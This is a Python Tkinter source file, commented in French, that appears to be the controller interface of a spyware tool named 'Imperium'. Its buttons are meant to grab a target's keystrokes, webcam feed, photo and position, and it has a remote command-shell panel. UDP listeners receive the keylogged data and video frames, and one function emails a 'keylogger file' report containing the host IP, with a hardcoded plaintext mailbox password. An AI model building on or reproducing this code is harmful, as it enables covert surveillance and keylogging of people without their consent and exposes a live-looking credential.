#bibliothèque graphiques
from msilib.schema import ListBox
from tkinter import *
import tkinter.font
#bibliothèque réseau/système
import numpy as np
import threading
import cv2 as cv
import socket
import threading
import imutils
import base64 
import sys
import time
from queue import Queue
import smtplib
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
global opconnect

# #################################################################################################################### #

                                          # # # PARTIE RESEAU # # #

# #################################################################################################################### #
opconnect = False
BUFF_SIZE = 65536
myname = socket.gethostname()
myip = socket.gethostbyname(socket.gethostname())
global keysreceived

def connectioncheck():
	host = '127.0.0.1'
	port = 9998
	while True :
			try :
				client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				client.sendto(b'Connexion Check', (host, port))
				data, addr = client.recvfrom(4096)
				print(data)
			except ConnectionResetError:
				opconnect = False
				break

			time.sleep(5)

			

def threadconnectioncheck():
	checker = threading.Thread(target=connectioncheck)
	checker.start()

def HackNasa():
	host = '127.0.0.1'
	port = 9998
	try :
		client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		client.sendto(b'hacking nasa', (host, port))
		data, addr = client.recvfrom(4096)
	except ConnectionResetError:
		pass

	print(data)

def udpkeyslisten():
	bind_ip = "127.0.0.1"
	bind_port = 9998

	server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	server.setsockopt(socket.SOL_SOCKET,socket.SO_RCVBUF,BUFF_SIZE)

	server.bind((bind_ip, bind_port))

	print("[*] Ready for data at %s:%d" % (bind_ip, bind_port))

	data, addr = server.recvfrom(1024)
	keysreceived = data.decode()

	print("[*] Got data from %s:%d: %s" % (addr[0], addr[1], data))

	server.sendto(b"ACK!", addr)
	return keysreceived

def udpvideolisten():
	
	BUFF_SIZE = 65536
	client_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_RCVBUF,BUFF_SIZE)
	host_name = socket.gethostname()
	host_ip = '127.0.0.1'#  socket.gethostbyname(host_name)
	print(host_ip)
	port = 9999
	port2 = 9998
	message = b'Hello'
	client_socket.sendto(message,(host_ip,port))
	opconnect = True
	threadconnectioncheck()
	fps,st,frames_to_count,cnt = (0,0,20,0)
	while True:
		if opconnect==False:
			break
		packet,_ = client_socket.recvfrom(BUFF_SIZE)
		data = base64.b64decode(packet,' /')
		npdata = np.fromstring(data,dtype=np.uint8)
		frame = cv.imdecode(npdata,1)
		frame = cv.putText(frame,'FPS: '+str(fps),(10,40),cv.FONT_HERSHEY_SIMPLEX,0.7,(0,0,255),2)
		cv.imshow("RECEIVING VIDEO",frame)
		key = cv.waitKey(1) & 0xFF
		if key == ord('q'):
			client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			client.sendto(b'closing video', (host_ip, port2))
			#data, addr = client.recvfrom(4096)
			#print(data)
			client_socket.close()
			break
		if cnt == frames_to_count:
			try:
				fps = round(frames_to_count/(time.time()-st))
				st=time.time()
				cnt=0
			except:
				pass
		cnt+=1
	#client.bind((bind_ip, bind_port))

	#print("[*] Ready for data at %s:%d" % (bind_ip, bind_port))

	#data, addr = server.recvfrom(1024)
	#videoreceived = data.decode()

	#print("[*] Got data from %s:%d: %s" % (addr[0], addr[1], data))

	#server.sendto(b"ACK!", addr)
	#return videoreceived

def threadudplisten():
	listener = threading.Thread(target=udpkeyslisten)
	listener.start()

def send_ip_mail():
    """
    fonction permettant d'envoyer l'ip par mail
    """
    email = "sending.address420@hotmail.com"
    message = MIMEMultipart()
    message["From"] = email                   # sender email address
    message['To'] = email                     # receiving email address 
    message['Subject'] = f"keylogger file of {str(datetime.datetime.now())[:22]} {myip}" # mail subject
                           # path to file                      
    my_message = message.as_string()
    email_session = smtplib.SMTP('smtp.outlook.com',587)
    email_session.starttls()
    email_session.login(email,'havefuninlife<3')
    email_session.sendmail(email, email,my_message)
    email_session.quit()
    print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")

# #################################################################################################################### #

                                          # # # PARTIE GRAPHIQUE # # #

# #################################################################################################################### #

master = Tk()
# sets the geometry of main
# root window
master.title("Imperium")
master.geometry("720x480")
master.minsize(720,480)
master.maxsize(720,480)
master.iconbitmap("spyware-icon-3.ico")
master.config(background="black")

def openPositionWindow():
	
	# Toplevel object which will
	# be treated as a new window
	newWindow = Toplevel(master)

	# sets the title of the
	# Toplevel widget
	newWindow.title("Imperium Position")
	newWindow.iconbitmap("spyware-icon-3.ico")
	newWindow.config(background="black")
	# sets the geometry of toplevel
	newWindow.geometry("480x480")

	# A Label widget to show in toplevel
	Label(newWindow,text ="Target's position :",font=("System", 17), bg='black',fg='green').pack()

def openKeysWindow():
	
	# Toplevel object which will
	# be treated as a new window
	newWindow = Toplevel(master)

	# sets the title of the
	# Toplevel widget
	newWindow.title("Imperium Keys")
	newWindow.config(background="black")
	newWindow.iconbitmap("spyware-icon-3.ico")

	# sets the geometry of toplevel
	newWindow.geometry("480x480")

	# A Label widget to show in toplevel
	Label(newWindow,text ="Target's keys received !",font=("System", 17), bg='black',fg='green').pack()
	#udplisten()
	keysreceived = udpkeyslisten()
	Label(newWindow,text=keysreceived,font=("System", 17), bg='black',fg='green').pack()
	"""f = open("Keyloglog.txt", mode = "w")
	f.write(keysreceived)
	f.close"""
def openCameraWindow():
	
	# Toplevel object which will
	# be treated as a new window
	"""newWindow = Toplevel(master)

	# sets the title of the
	# Toplevel widget
	newWindow.title("Imperium Webcam")
	newWindow.config(background="black")
	newWindow.iconbitmap("spyware-icon-3.ico")

	# sets the geometry of toplevel
	newWindow.geometry("480x480")

	# A Label widget to show in toplevel
	Label(newWindow,text ="Target's webcam:",font=("System", 17), bg='black',fg='green').pack()"""
	cap = cv.VideoCapture(0)
	print(cap.isOpened())
	print(cv.COLOR_BGR2GRAY)
	if not cap.isOpened():
		print("Cannot open camera")
		exit()
	while True:
		# Capture frame-by-frame
		ret, frame = cap.read()
		# if frame is read correctly ret is True
		if not ret:
			print("Can't receive frame (stream end?). Exiting ...")
			break
		# Our operations on the frame come here
		grey = cv.cvtColor(frame, 0)
		
		# Display the resulting frame
		cv.imshow('Target Webcam', grey)
		if cv.waitKey(1) == ord('q') or cv.waitKey(1) == ord('Q'):
			break
	# When everything done, release the capture
	cap.release()
	cv.destroyAllWindows()

def openPhotoWindow():
	
	# Toplevel object which will
	# be treated as a new window
	newWindow = Toplevel(master)

	# sets the title of the
	# Toplevel widget
	newWindow.title("Imperium Photo")
	newWindow.config(background="black")
	newWindow.iconbitmap("spyware-icon-3.ico")

	# sets the geometry of toplevel
	newWindow.geometry("480x480")

	# A Label widget to show in toplevel
	Label(newWindow,text ="Target's Photo:",font=("System", 17), bg='black',fg='green').pack()

#On sépare la fenetre en 4

#Frame pour la liste de cibles
FrameHautGauche = Frame(bg='Black')

#Frame pour les boutons
FrameBasDroit = Frame(bg='Black')

#Frame pour l'input shell
FrameBasGauche = Frame(bg='Black')

#Frame pour l'output du shell
FrameHautDroit = Frame(bg='Black')

label = Label(FrameHautGauche,text ="Select a Target :",font=("System", 22), bg='black',fg='green')
label.pack(pady=0,padx=20,expand=YES)
#label.grid(ipadx=100 ,padx = 60,pady=20,row=0,column=0,sticky = N)

targetlist = Listbox(FrameHautGauche,bg='#021D09',font=("System", 15),fg='green',highlightcolor='#5C9A6C',yscrollcommand=YES)
targetlist.pack(ipady=40,ipadx=60,pady=5,padx=15,expand=YES)

#targetlist.grid(padx=5,row=1,column=0,sticky=N)

# a button widget which will open a
# new window on button click
posbtn = Button(FrameHautDroit, 
			text ="Get Target Position",font=("System", 15), bg='black',fg='green',
			#style = 'W.TButton',
			command = openPositionWindow)
#posbtn.pack()
posbtn.grid(ipadx=32,ipady=4,padx=50,pady=7,row=2,column=1,sticky = N)

keysbtn = Button(FrameHautDroit,
			text ="Get Target Keys",font=("System", 15), bg='black',fg='green',
			#style = 'W.TButton',
			command = openKeysWindow)
#keysbtn.pack()
keysbtn.grid(ipadx=45,ipady=4,padx=50,pady=7,row=3,column=1,sticky = N)

camerabtn = Button(FrameHautDroit,
			text ="Get Target Webcam", font=("System", 15), bg='black',fg='green',
			#style = 'W.TButton',
			command = udpvideolisten)
#camerabtn.pack()
camerabtn.grid(ipadx=30,ipady=4,padx=50,pady=7,row=4,column=1,sticky=N)

photobtn = Button(FrameHautDroit,
			text ="Get Target Photo", font=("System", 15), bg='black',fg='green',
			#style = 'W.TButton',
			command = openPhotoWindow)
#photobtn.pack()
photobtn.grid(ipadx=41,ipady=4,padx=50,pady=7,row=5,column=1,sticky = N)

hacknasabtn = Button(FrameHautDroit,
			text ="Hack N.A.S.A", font=("System", 15), bg='black',fg='green',
			
			command = HackNasa)
#photobtn.pack()
hacknasabtn.grid(ipadx=58,ipady=4,padx=50,pady=7,row=6,column=1,sticky = N)

label2 = Label(FrameBasGauche,text ="Target's Cmd :",font=("System", 17), bg='black',fg='green')
label2.grid(row=3,column=0,sticky=W)
textfromshell= ""
distantshellinput = Entry(FrameBasGauche,font=("System", 17), bg='#021D09',fg='green')
distantshellinput.grid(ipadx=4,pady=2,row=4,column=0,sticky = W)
#distantshellinput.insert(0,">>>")

distantshelloutput = Text(FrameHautDroit,font=("System", 17), bg='#021D09',fg='green',height=7,width=40)
distantshelloutput.grid(ipadx=0,ipady=10,pady=5,row=8,column=1,sticky = N)
distantshelloutput.insert(END,"Output :")

FrameHautGauche.grid(pady=10,row=0,column=0,sticky=N)
FrameBasGauche.grid(padx=20,pady=370,row=0,column=0,sticky=W)
FrameHautDroit.grid(pady=12,row=0,column=1,sticky=N)
FrameBasDroit.grid(row=1,column=1,sticky=N)
# mainloop, runs infinitely
mainloop()
